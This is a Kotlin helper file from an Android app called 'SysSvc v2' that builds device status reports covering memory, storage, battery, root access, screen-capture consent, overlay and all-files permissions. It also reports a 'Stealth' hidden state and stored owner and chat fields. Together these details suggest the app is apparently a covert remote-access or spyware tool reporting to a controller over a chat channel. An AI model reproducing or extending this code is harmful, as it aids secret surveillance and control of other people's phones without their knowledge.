package com.sys.svc.helpers

import android.app.ActivityManager
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import com.sys.svc.Prefs
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object StatusHelper {

    fun status(ctx: Context): String {
        val am = ctx.getSystemService(ActivityManager::class.java)
        val mi = ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        val ramTotal = mi.totalMem / 1024 / 1024
        val ramFree = mi.availMem / 1024 / 1024
        val ramPct = if (ramTotal > 0) ((ramTotal - ramFree) * 100 / ramTotal) else 0

        val stat = StatFs(Environment.getExternalStorageDirectory().path)
        val diskTotal = stat.blockCountLong * stat.blockSizeLong / 1024 / 1024
        val diskFree = stat.availableBlocksLong * stat.blockSizeLong / 1024 / 1024
        val diskPct = if (diskTotal > 0) ((diskTotal - diskFree) * 100 / diskTotal) else 0

        val bm = ctx.getSystemService(BatteryManager::class.java)
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val charging = bm.isCharging

        val uptimeMs = SystemClock.elapsedRealtime()
        val d = uptimeMs / 86_400_000
        val h = (uptimeMs % 86_400_000) / 3_600_000
        val m = (uptimeMs % 3_600_000) / 60_000

        return buildString {
            appendLine("📊 ${Build.MODEL}")
            appendLine("━━━━━━━━━━━━━━━━━━━━")
            appendLine("🔧 ${Build.MANUFACTURER} · Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
            appendLine("⏱ روشن: ${d}d ${h}h ${m}m")
            appendLine("🔋 ${level}%${if (charging) " ⚡" else ""}")
            appendLine("💾 RAM: ${ramTotal - ramFree} / ${ramTotal} MB (${ramPct}%)")
            appendLine("💽 دیسک: ${diskTotal - diskFree} / ${diskTotal} MB (${diskPct}%)")
            appendLine("📱 ${ctx.packageName}")
            appendLine("🔒 Root: ${if (ShellHelper.isRooted()) "✅" else "❌"}")
            append("🫥 Stealth: ${Prefs.isHidden(ctx)}")
        }
    }

    fun info(ctx: Context): String {
        val pi = try { ctx.packageManager.getPackageInfo(ctx.packageName, 0) } catch (_: Exception) { null }
        val sb = StringBuilder()
        sb.appendLine("ℹ️ SysSvc v2")
        sb.appendLine()
        sb.appendLine("📦 Package: ${ctx.packageName}")
        sb.appendLine("📌 Version: ${pi?.versionName} (${pi?.versionCode})")
        sb.appendLine("🐍 PID: ${android.os.Process.myPid()}")
        sb.appendLine()
        sb.appendLine("🖥 ${Build.MANUFACTURER} ${Build.MODEL}")
        sb.appendLine("🤖 Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        sb.appendLine("🔧 Board: ${Build.BOARD}")
        sb.appendLine("🔩 Hardware: ${Build.HARDWARE}")
        sb.appendLine()
        sb.appendLine("🔒 Root: ${if (ShellHelper.isRooted()) "✅" else "❌"}")
        sb.appendLine("🎬 Projection consent: ${if (MediaProjectionHolder.getConsent() != null) "✅" else "❌"}")
        sb.appendLine("🪟 Overlay permission: ${if (OverlayHelper.canDrawOverlays(ctx)) "✅" else "❌"}")
        sb.appendLine("📁 All files: ${if (hasAllFiles(ctx)) "✅" else "❌"}")
        sb.appendLine()
        sb.appendLine("Owner: ${Prefs.getOwner(ctx) ?: "—"}")
        sb.appendLine("Chat: ${Prefs.getChat(ctx) ?: "—"}")
        sb.appendLine("Offset: ${Prefs.getOffset(ctx) ?: "—"}")
        sb.appendLine("Time: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}")
        return sb.toString()
    }

    private fun hasAllFiles(ctx: Context): Boolean =
        Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager()
}